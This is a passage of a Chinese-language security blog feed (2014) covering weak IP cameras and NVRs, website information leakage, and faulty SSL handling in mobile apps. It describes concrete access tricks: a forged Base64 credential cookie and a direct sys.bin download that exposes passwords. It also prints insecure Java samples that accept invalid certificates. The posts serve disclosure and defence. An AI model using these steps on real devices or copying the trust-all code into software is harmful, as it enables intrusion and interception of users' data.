    &lt;p&gt;這個案例實在是令人哭笑不得，不知道是原廠還是台灣代理商非常好心地幫使用者建立了多組預設帳號，包含 admin、666666、888888 等等，而且密碼也設定得很簡單。但是通常要使用者記得改一組預設密碼已經非常困難，更何況是要使用者改三組密碼呢？這種情形導致攻擊者可以輕而易舉地拿著弱密碼到處猜，大大提高了用戶的受害機率。而更有趣的是，不知道是基於歷史包袱或者其他原因，此設備開了特殊的 port，直接送出含有特定內容的封包到這個 port 就可以執行相對應的指令，例如可以取得帳號密碼、使用者 email 等等，而在這個過程中完全沒有任何認證機制！等於又有七百多台 NVR 在網路上裸奔…&lt;a href=&quot;/assets/img/blog/20140924/case_study_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_03.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 3&quot; title=&quot;網路攝影機、DVR、NVR 案例 3&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;某國內 A 牌廠商 （數量：1000+）&lt;/p&gt;

    &lt;p&gt;這間廠商也是使用常見的預設帳號密碼，但它可怕的地方還不止於此。該系統將帳號密碼轉為 Base64 編碼後直接當作 cookie 內容，因此若預設帳號密碼分別是 abc 與 123，將 abc:123 用 Base64 編碼過後可得到 YWJjOjEyMw==，接著將 Cookie: SSID=YWJjOjEyMw== 這串內容加到 request 的 HTTP header 中，就可以到處測試該設備是否使用預設帳號密碼，甚至還可以進一步下載備份檔，察看使用者有無填寫 email、網路帳號密碼等資料。&lt;a href=&quot;/assets/img/blog/20140924/case_study_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_04.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 4&quot; title=&quot;網路攝影機、DVR、NVR 案例 4&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;某國內 A 牌廠商（數量：10+）&lt;/p&gt;

    &lt;p&gt;這個案例雖然數量非常少，但是卻非常嚴重。為什麼呢？因為廠商沒有對機敏資料做嚴格的權限控管，只要攻擊者直接在網址列輸入 http://IP/sys.bin，就可以直接下載一個名為 sys.bin 的檔案，而此檔案是 tgz 格式，解壓縮後可以得到 system_server.conf，該檔案中含有帳號、密碼，因此即便使用者修改了預設帳號密碼，也會因為這個嚴重漏洞而輕易地被入侵。&lt;a href=&quot;/assets/img/blog/20140924/case_study_05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_05.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 5&quot; title=&quot;網路攝影機、DVR、NVR 案例 5&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XXXX科技 （數量：230+）&lt;/p&gt;

    &lt;p&gt;這是一個非常經典的案例！一般攻擊者入侵攝影機最常見的就是為了偷看攝影機畫面，再進階一點的可能會控制該攝影機進一步攻擊內網。而這家廠商身為知名保全公司投資成立的安控公司，理當為客戶的監控畫面做最周全的規劃、最謹慎的防護，但是結果呢？報告各位，完全沒有任何防護！只要連到 IP 位址就可以直接看到攝影機畫面，也是屬於裸奔一族…&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;從這幾個案例我們可以發現台灣目前至少有 3500 台左右的安控設備處於高風險狀態中，而由於我們無暇對每一款設備進行調查，因此這僅僅是一個概略的調查結果。同時這些設備都是在網路上可直接連線的，若再加上各個公家機關、辦公大樓、社區的內網安控設備，恐怕會有更驚人的發現。&lt;/p&gt;

&lt;h3 id=&quot;問題起源&quot;&gt;問題起源&lt;/h3&gt;

&lt;p&gt;究竟為什麼會有這麼多安控設備被入侵呢？其實主要有兩個面向。第一個是由於許多廠商的防範觀念仍停留在舊時代，不了解駭客到底都怎麼攻擊，因此也不了解確切的防治方法。舉例來說，廠商在網路安控系統的 Web 輸入介面都會設定許多阻擋規則，以防範入侵者輸入惡意攻擊指令，但是這些防治手段都僅僅做在 client 端（用 JavaScript 來防護），入侵者只要利用 proxy 工具或自行寫程式發送客製化 request 就可以繞過那些驗證，若廠商沒有在 server 端再次進行驗證輸入資料是否異常，就有很高的機會被入侵成功。&lt;/p&gt;

&lt;p&gt;另一方面則是入侵者的攻擊手法千變萬化，難以保證不會有新的 0-Day 弱點出現。例如今年一月份大量爆發的 NTP 弱點 CVE-2013-5211 就存在於上述六個案例其中之一，我想廠商應該不會有意願針對舊產品修復此類漏洞，也就是未來隨時有幾百台的攝影機可被惡意人士用來執行 DDoS 攻擊。另外今年四月份的 OpenSSL Heartbleed 弱點更是一個具有代表性的重要案例，我想這應該是許多安控設備廠商都會使用的程式。當廠商將此類程式納入網路安控設備中，於弱點被揭露時若無法及時有效修補，或是修補的成本太高導致用戶不願意修補、沒有能力修補，就有可能釀成重大災情，不但造成用戶損失，也嚴重影響商譽。&lt;/p&gt;

&lt;h3 id=&quot;廠商該如何因應&quot;&gt;廠商該如何因應？&lt;/h3&gt;

&lt;p&gt;針對此類資安問題，大型硬體廠商應該落實以下幾個動作：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;改善資安問題更新流程：將產品的資安更新改變成主動通知使用者，而非需要使用者主動到官網看才知道更新，以縮短使用者更新的平均週期，確保使用者的軟體是最新無風險版本。&lt;/li&gt;
  &lt;li&gt;成立專門資安小組：請專人負責檢驗產品的資安品質與修正資安弱點，以便因應臨時爆發的重大弱點，維持產品的資安品質。&lt;/li&gt;
  &lt;li&gt;黑箱滲透測試：於產品出廠前執行黑箱滲透測試，讓滲透測試專家從黑帽駭客的角度來檢查產品有無漏洞。&lt;/li&gt;
  &lt;li&gt;白箱原始碼檢測：定期執行原始碼檢測，從產品的根本處著手改善，降低產品上市後才被發現弱點的機率。&lt;/li&gt;
  &lt;li&gt;資安教育訓練：請有實際攻防經驗的資安專家給予開發人員正確的資安觀念，了解最新的攻擊手法與有效防禦之道。&lt;/li&gt;
  &lt;li&gt;定期檢閱產品所使用的第三方軟體套件是否有弱點，例如 OpenSSL，以避免把有問題的版本納入產品，造成產品間接產生弱點，因而遭到入侵。&lt;/li&gt;
  &lt;li&gt;定時於網路上收集產品的相關弱點資料，例如 &lt;a href=&quot;http://secunia.com/&quot;&gt;Secunia&lt;/a&gt;、&lt;a href=&quot;http://www.securityfocus.com/&quot;&gt;SecurityFocus&lt;/a&gt;、&lt;a href=&quot;http://packetstormsecurity.com/&quot;&gt;Packet Storm&lt;/a&gt; 等網站都是很好的資訊來源。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;一般使用者企業該如何亡羊補牢&quot;&gt;一般使用者、企業該如何亡羊補牢？&lt;/h3&gt;

&lt;p&gt;目前的網路安控系統使用者仍未有足夠的資安意識，主要現象有以下幾點：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;使用弱密碼&lt;/li&gt;
  &lt;li&gt;未進行適當的權限劃分與管理&lt;/li&gt;
  &lt;li&gt;容易開啓攻擊者寄送的惡意連結，導致被 XSS、CSRF 等手法攻擊&lt;/li&gt;
  &lt;li&gt;未限制連入 IP 位址，導致安控系統可從外網任意存取&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;然而，無論是安控系統或其他任何連網設備，未來都有可能成為潛在的攻擊目標，而且在廠商提供更新檔之前其實也很難確實地自保，因此了解資安知識與常見的攻擊手法是有其必要的。基本的防範之道如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;使用強密碼，包含大小寫英文、數字、特殊符號，並且定期更換密碼&lt;/li&gt;
  &lt;li&gt;勿在系統建立太多不必要的使用者帳號、將多餘的帳號移除，以降低帳號被盜的機率。若需要建立多組帳號，請仔細給予適當的權限&lt;/li&gt;
  &lt;li&gt;勿隨意開啟可疑信件附帶的連結或檔案，以避免被攻擊者以 XSS、CSRF 等手法攻擊&lt;/li&gt;
  &lt;li&gt;限制可存取資訊系統的 IP 位址，避免資訊系統成為公開的攻擊目標&lt;/li&gt;
  &lt;li&gt;定期檢查 log，確認有無異常登入、異常操作甚至是異常帳號等資訊&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;在物連網的時代中，各種可進行無線通訊的設備被攻擊的事件屢見不鮮，例如 2011 年知名駭客 Jay Radcliffe 在 Black Hat 展示如何攻擊胰島素注射器，2013 年已故駭客 Barnaby Jack 原本要在 Black Hat 展示如何利用藍芽通訊控制心律調整器，甚至 2014 年甫推出的可遠程變換顏色燈泡也被揭露有資安問題。在不久的未來，這些資安問題只會更多，身為民眾、企業、廠商的你，準備好面對萬物皆可駭的物連網時代了嗎？&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/</link>
                <guid>https://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr</guid>
                <pubDate>Wed, 24 Sep 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>被遺忘的資訊洩漏－重點回顧</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;在今年駭客年會企業場，我們分享了一場『被遺忘的資訊洩漏』。資訊洩漏是十幾年前就被一提再提的議題，在資訊安全領域中也是最最最基本該注意的事情，然而至今很多網站都還是忽略它，甚至連一些熱門網站都仍有資訊洩漏問題。議程中我們舉了大量的例子證明資訊洩漏其實可以很嚴重，希望能幫大家複習一下，如果網站沒有注意這些，會造成什麼樣的後果。議程投影片如下所示，就讓我們來總結一下吧！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;center&gt;&lt;iframe src=&quot;http://www.slideshare.net/slideshow/embed_code/38312258&quot; width=&quot;560&quot; height=&quot;460&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&quot;&gt; &lt;/iframe&gt;&lt;/center&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;devcore-常利用的資訊洩漏&quot;&gt;DEVCORE 常利用的資訊洩漏&lt;/h3&gt;

&lt;p&gt;首先我們從過往滲透測試經驗中挑選了幾個常見的資訊洩漏問題，分別如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;管理介面洩漏 (p8-p19)&lt;/li&gt;
  &lt;li&gt;目錄(Index of)洩漏 (p20-p28)&lt;/li&gt;
  &lt;li&gt;錯誤訊息洩漏 (p29-p35)&lt;/li&gt;
  &lt;li&gt;暫存、測試資訊 (p36-p46)&lt;/li&gt;
  &lt;li&gt;版本控管 (p47-p55)&lt;/li&gt;
  &lt;li&gt;DNS 資訊洩漏 (p56-p63)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以上種種不同洩漏方式，可能會洩漏出系統環境資訊、程式碼內容、含有帳號密碼的設定檔等。透過這些資訊，駭客就能組織出一個有效的攻擊行動。我們甚至在過往的經驗中，只透過目標的資訊洩漏，就直接取得資料庫操作權限(詳見投影片 p65-p71)。&lt;/p&gt;

&lt;p&gt;為了解目前一些熱門網站是否重視這些最基本的保護，我們實際對 alexa 台灣前 525 名的網站進行資訊洩漏的調查。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/phpmyadmin_leak.jpg&quot; alt=&quot;phpmyadmin 頁面洩漏狀況&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20140826/phpinfo_leak.jpg&quot; alt=&quot;phpinfo 頁面洩漏狀況&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在管理介面和測試頁面洩漏的項目，我們用很保守的方式測試根目錄下是否存有 phpmyadmin 和 phpinfo 頁面，結果分別有 7% 和 9% 的網站有這樣的問題。這樣的結果非常令人訝異，畢竟受測網站都是知名且有技術力的網站，而且並非所有網站都使用 php 開發，再加上我們只是測試預設的命名，實際洩漏的情況會更多！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/version_control_leak.jpg&quot; alt=&quot;版本控制洩漏狀況&quot; /&gt;&lt;/p&gt;

&lt;p&gt;另一個值得一提的是版本控管洩漏問題，我們同樣保守的只針對版本控管軟體中 GIT 和 SVN 兩項進行調查。結果竟然有 10% 的網站有這樣的問題。這個現象非常嚴重！這個現象非常嚴重！這個現象非常嚴重！這個洩漏有機會能還原整個服務的原始碼，被攻擊成功的機率相當高！台灣熱門的網站裡，十個裡面就有一個存有這樣的問題，非常危險，煩請看到這篇文章的朋友能去注意貴公司的網站是否存在這樣的問題。&lt;/p&gt;

&lt;h3 id=&quot;大數據資料蒐集&quot;&gt;大數據資料蒐集&lt;/h3&gt;

&lt;p&gt;在這場議程中，我們還提到了另一個層次的資訊洩漏議題：當全世界主機的服務及版本資訊全部都被收集起來，會發生什麼樣的事情？&lt;/p&gt;

&lt;p&gt;駭客擁有這樣的資料，就能夠在非常短暫的時間內篩選出有問題的主機，進行大量的入侵。我們利用類似的技術針對台灣主機快速的進行掃描，就發現了台灣有 61414 台主機可以被利用來做 DNS Amplification DDoS 攻擊、1003 台主機可以被利用來做 NTP Amplification DDoS 攻擊。也就是說，駭客可以在短時間內組織一支六萬多人的台灣大軍，可以針對他想要攻擊的目標進行攻擊。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/heartbleed.jpg&quot; alt=&quot;OpenSSL Heartbleed 尚未修復的狀況&quot; /&gt;&lt;/p&gt;

&lt;p&gt;利用相同的技術，我們也順便檢驗了前陣子非常熱門的 &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; 問題。OpenSSL Heartbleed 被稱之為『近十年網路最嚴重的安全漏洞』，其嚴重程度可以想見，然而根據我們的觀察，台灣至今仍有 1480 台 HTTP 伺服器尚未修復，而台灣前 525 大熱門網站中，也有 21 個(4%)網站未修復。足見台灣網站對於資安的意識仍然不夠。&lt;/p&gt;

&lt;p&gt;對於這樣海量收集資料衍生的資安議題，我們認為最大的受害者，是物聯網的使用者！就我們的觀察，物聯網的設備通常安全防護不佳，容易遭受到駭客攻擊，前陣子 &lt;a href=&quot;http://www8.hp.com/us/en/hp-news/press-release.html?id=1744676&quot;&gt;HP 也出了一份報告指出&lt;/a&gt;，物聯網的設備有七成存在弱點，而且每台設備平均有 25 個弱點。除此之外，物聯網的設備不易更新，少有人會定期更新，更導致物聯網設備可以被大範圍的攻擊，進而滲透家用網路，危害使用者居家隱私。這是個未來需要持續關注的重要議題。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/synolocker.jpg&quot; alt=&quot;仍暴露在 SynoLocker 風險狀況統計&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最後，我們用最近 SynoLocker 的案例為大數據資料蒐集作結，SynoLocker 是一款針對 Synology 的勒索軟體，去年底 Synology 官方已經推出新版修正問題，本月 SynoLocker 擴散至全世界，新聞一再強調需要更新 NAS，但我們針對台灣 1812 台對外開放的 Synology NAS 做統計，至今仍發現有 64％ 的使用者沒有更新，也就是這些 NAS 仍暴露在 SynoLocker 的風險中。這件事情又再次證明駭客有能力在短時間利用大數據資料找到攻擊目標，也順帶說明了台灣資安意識普遍不足的問題。&lt;/p&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;在這次議題我們關注了很古老的資訊洩漏問題，並且發現目前台灣一些熱門網站仍然存在這樣的問題。資訊洩漏也許不是一件很嚴重的事情，但往往能激起駭客高漲的情緒，駭客會認為一個網站連最最最基本的資料保護都沒有做到，一定會存在其他資安問題，進而進行更大量的攻擊行為。而事實上，我們也從實例證明了其實資訊洩漏可以很嚴重，希望網站提供者能夠注重這個簡單可解決且重要的議題。&lt;/p&gt;

&lt;p&gt;我們也提到了駭客透過平常大量的資料收集，在需要的時候能快速找到目標並且大範圍攻擊。這其中又以物聯網的用戶影響最多。面對這樣的議題，我們建議除了適當的隱藏(偽造)主機版本資訊以避免出現 0-Day 時成為首要攻擊目標。我們也提倡要對自己的服務做普查，了解自己到底對外開啟了什麼服務，以及關注自己使用的&lt;a href=&quot;http://devco.re/blog/2014/03/14/3rd-party-software-security-issues/&quot;&gt;第三方套件&lt;/a&gt;是否有安全更新。&lt;/p&gt;

&lt;p&gt;希望明年不需要再有一篇『依舊沒改變的資訊洩漏』！大家快點注意這件簡單的事情吧！&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014/</link>
                <guid>https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014</guid>
                <pubDate>Tue, 26 Aug 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>手機應用程式開發上被忽略的 SSL 處理</title>
                <description>&lt;p&gt;在網路上傳輸敏感資訊時，通常會使用 HTTPS 協定，讓客戶端與伺服器端對資料進行 SSL 加密處理，以降低資料在傳輸過程中被監聽或中間人攻擊的風險。HTTPS 的重要性逐漸被重視，Google 除了預設開啟 HTTPS 之外，未來更會將 &lt;a href=&quot;http://googlewebmastercentral.blogspot.tw/2014/08/https-as-ranking-signal.html&quot;&gt;HTTPS 的網站搜尋排名加分&lt;/a&gt;。但為了確保傳輸的安全，過程中客戶端會核對伺服器的憑證鏈 (certificate chain) 是否有效，若判定為無效時會作出警告。(詳見&lt;a href=&quot;http://en.wikipedia.org/wiki/Secure_Sockets_Layer&quot;&gt;Wikipedia&lt;/a&gt;)&lt;/p&gt;

&lt;!-- more --&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140815/desktop_browser_insecure_warning.png&quot; alt=&quot;Desktop 警告圖&quot; /&gt;
而在手機應用程式上 HTTPS 同樣重要，例如網路銀行、線上購物等。系統同樣會做憑證核對，但對被判定為無效的憑證就需要開發者作出額外的處理了。許多手機應用程式開發商在這個部分並沒有妥善處理好，以下我們就幾個常見的成因做基本的探討。&lt;/p&gt;

&lt;h3 id=&quot;會被系統判定為無效的常見成因&quot;&gt;會被系統判定為無效的常見成因？&lt;/h3&gt;
&lt;p&gt;在探討該如何處理這個問題之前，這裡先列出一些有可能被系統判定成無效憑證的成因。&lt;/p&gt;

&lt;h4 id=&quot;1-系統支援問題-&quot;&gt;1. 系統支援問題 &lt;sup id=&quot;fnref:note1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/h4&gt;
&lt;p&gt;在 Android 2.2 及之前的版本，對 SSL 的支援上存在著一些問題，像是 &lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=12908&quot;&gt;SNI&lt;/a&gt; 和 &lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=26542&quot;&gt;Multiple Chain&lt;/a&gt;。而 Android 上不接受缺少中繼 CA 憑證的憑證鏈，例如：&lt;a href=&quot;https://egov.uscis.gov/&quot;&gt;https://egov.uscis.gov/&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;2-相關憑證未被預載到系統中&quot;&gt;2. 相關憑證未被預載到系統中&lt;/h4&gt;
&lt;p&gt;以 GCA 簽發的 SSL 憑證為例，在 Windows 上被判定為有效，但在 iOS 系統上卻因為 CA 不在系統的預載清單中而被判定為無效。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140815/windows_recognize_gca.png&quot; alt=&quot;Windows&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20140815/iphone_unknown_ca.png&quot; alt=&quot;iPhone&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;3-使用自行簽發的憑證&quot;&gt;3. 使用自行簽發的憑證&lt;/h4&gt;
&lt;p&gt;這種情況常出現在應用程式開發階段的內部測試環境中，由於是內部測試環境一般都不會花錢去申請憑證。&lt;/p&gt;

&lt;h4 id=&quot;4-連線被中間人mitm攻擊&quot;&gt;4. 連線被中間人(MITM)攻擊&lt;/h4&gt;
&lt;p&gt;當連線被 MITM 攻擊時，使用者原本的連線目的地會被導到攻擊者的設備上，此時伺服器憑證也會被取代成攻擊者自行簽發的憑證，造成原本正常的連線出現異常。&lt;/p&gt;

&lt;h3 id=&quot;開發者該如何處理&quot;&gt;開發者該如何處理？&lt;/h3&gt;

&lt;p&gt;理想情況下，客戶端的支援度充足，伺服器憑證鏈的來源及設定正確，只需使用系統原有的方式去檢查憑證即可達到安全效果。但若非得要相容低版本系統或是自行簽發憑證的時候，就得自行做額外的檢查。&lt;/p&gt;

&lt;p&gt;在處理方式上，普遍是使用憑證綁定 (certificate pinning) 的方式，把需要比對的憑證預先存放在應用程式裡，待要進行 SSL Handshake 的時候再與伺服器的憑證做比對。&lt;/p&gt;

&lt;p&gt;可是在實務上，大多開發人員採用消極的方法，把錯誤警告略過讓連線繼續進行，使得本來使用 SSL 加密連線帶來的安全性形同虛設。據 2012 年 &lt;a href=&quot;http://android-ssl.org/files/p50-fahl.pdf&quot;&gt;Why Eve and Mallory Love Android: An Analysis of SSL (In)Security on Android&lt;/a&gt; 這篇論文指出，在 Google Play 上 13500 個免費熱門應用程式當中，共有 1074 個 (8%) 應用程式因錯誤的 SSL 處理而導致使用者陷入 MITM 攻擊的風險中。&lt;/p&gt;

&lt;p&gt;下面我們整理了一些在手機應用開發上，常見的 SSL 處理錯誤，以及其對應適當的處理方法。&lt;/p&gt;

&lt;h4 id=&quot;android-錯誤處理情況1&quot;&gt;Android 錯誤處理情況1&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onReceivedSslError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;WebView&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SslErrorHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SslError&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;proceed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;當透過 WebView 元件訪問 HTTPS 網站發生 SSL 錯誤時，會觸發 onReceivedSslError 這個函數。根據官方文件指出，可藉由執行 handler.proceed() 或是 handler.cancel() 來決定是否讓連線繼續進行。在不覆寫這函數的情況下預設會執行 handler.cancel()。而上面的做法卻讓異常的連線繼續進行了。&lt;/p&gt;

&lt;p&gt;較為恰當的做法是使用 handler.cancel() 讓連線終止，或是限制在開發階段才執行 handler.proceed()。像 &lt;a href=&quot;https://github.com/apache/cordova-android/blob/3.5.1/framework/src/org/apache/cordova/CordovaWebViewClient.java#L298&quot;&gt;Apache Coradova&lt;/a&gt; 和 &lt;a href=&quot;https://github.com/facebook/facebook-android-sdk/blob/sdk-version-3.15.0/facebook/src/com/facebook/widget/WebDialog.java#L420&quot;&gt;Facebook Android SDK&lt;/a&gt; 皆有對這部分做控管。&lt;/p&gt;

&lt;h4 id=&quot;android-錯誤處理情況2&quot;&gt;Android 錯誤處理情況2&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nc&quot;&gt;TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trustAllManager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;X509TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkClientTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkServerTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getAcceptedIssuers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;nc&quot;&gt;SSLContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sslContext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SSLContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TLS&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sslContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trustAllManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
